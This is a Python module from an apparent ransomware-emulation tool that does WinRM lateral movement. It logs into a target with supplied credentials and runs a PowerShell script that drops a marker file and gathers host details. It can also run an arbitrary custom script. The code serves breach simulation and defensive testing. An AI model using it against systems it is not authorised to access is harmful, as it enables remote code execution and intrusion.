"""WinRM lateral movement via pywinrm."""

from __future__ import annotations

from ransomemu.core.logger import get_logger
from ransomemu.modules.lateral.base import LateralMoveBase, MoveResult

logger = get_logger(__name__)

MARKER_PS_SCRIPT = '''
$marker = "[RANSOMEMU] Simulation marker — {timestamp} — This file proves access."
Set-Content -Path "C:\\ransomemu_marker.txt" -Value $marker
$info = @{{
    hostname = $env:COMPUTERNAME
    os = (Get-CimInstance Win32_OperatingSystem).Caption
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {{ $_.InterfaceAlias -ne "Loopback" }} | Select-Object -First 1).IPAddress
    user = $env:USERNAME
}}
$info | ConvertTo-Json
'''


class WinRMMove(LateralMoveBase):
    """Lateral movement via WinRM using pywinrm."""

    protocol = "WinRM"

    def _execute(
        self,
        target: str,
        username: str = "",
        password: str = "",
        domain: str = "",
        use_ssl: bool = False,
        custom_script: str = "",
        **kwargs,
    ) -> MoveResult:
        from datetime import datetime, timezone

        try:
            import winrm
        except ImportError:
            return MoveResult(
                target=target,
                protocol=self.protocol,
                success=False,
                error="pywinrm not installed",
            )

        port = 5986 if use_ssl else 5985
        scheme = "https" if use_ssl else "http"
        endpoint = f"{scheme}://{target}:{port}/wsman"

        full_user = f"{domain}\\{username}" if domain else username

        try:
            session = winrm.Session(
                endpoint,
                auth=(full_user, password),
                transport="ntlm",
                server_cert_validation="ignore" if use_ssl else "validate",
                read_timeout_sec=self._config.timeout,
                operation_timeout_sec=self._config.timeout - 10,
            )

            # Deploy marker and collect system info
            script = custom_script if custom_script else MARKER_PS_SCRIPT.format(
                timestamp=datetime.now(timezone.utc).isoformat()
            )
            result = session.run_ps(script)

            if result.status_code == 0:
                return MoveResult(
                    target=target,
                    protocol=self.protocol,
                    success=True,
                    output=result.std_out.decode("utf-8", errors="replace").strip(),
                    files_marked=1,
                )
            else:
                return MoveResult(
                    target=target,
                    protocol=self.protocol,
                    success=False,
                    error=result.std_err.decode("utf-8", errors="replace").strip(),
                )

        except Exception as exc:
            return MoveResult(
                target=target,
                protocol=self.protocol,
                success=False,
                error=str(exc),
            )
